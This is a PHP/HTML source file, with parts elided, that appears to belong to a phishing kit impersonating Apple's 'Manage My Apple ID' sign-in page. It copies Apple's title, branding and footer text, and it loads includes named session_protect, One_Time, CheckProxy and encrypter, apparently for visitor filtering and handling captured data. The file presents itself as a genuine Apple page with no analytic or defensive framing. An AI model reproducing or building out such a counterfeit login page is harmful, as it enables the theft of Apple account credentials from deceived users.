...
/**
 * @Author: Ilham Ahmad
 * @Date:   2018-03-04 06:33:28
 * @Last Modified by:   Ilham Ahmad
 * @Last Modified time: 2018-03-06 18:39:18
 */
require('configuration.php');
require('assets/includes/wannabe.php');
require('assets/includes/session_load.php');
require('assets/includes/session_protect.php');
require('assets/includes/functions.php');
require('assets/includes/language.php');
require('assets/includes/One_Time.php');
require('assets/includes/CheckProxy.php');
require('assets/includes/encrypter.php');
?>
    <!DOCTYPE html>
    <html>
    ...
    <head>
        ...
        <title>Manage My Apple ID - Apple</title>
                    ...
                    <div class="flow-body signin clearfix" role="main">
                        <div class="container">
                            ...
                            <div class="flex home-content">
                                <h2 id="Title" class="title separator" style="font-weight: 500;">Your account for&nbsp;everything&nbsp;Apple.</h2>
                                <div id="TitleMsg" class="intro" style="max-width: 400px;margin: auto;">A single Apple&nbsp;ID and password gives you access to all Apple services. <a class="button faq-link" href="#">Learn more about Apple&nbsp;ID&nbsp;<i class="icon Righty"></i></a></div>
                            ...
                            <div class="footer-wrap">
                                <div class="FooterLine1">
                                    <div class="line-level">Shop the <a href="#">Apple Online Store</a> (
                                        <?php echo $lang['APPCALL'];?>), visit an <a href="#">Apple Retail Store</a>, or find a <a href="#">reseller</a>.</div>
                                </div>
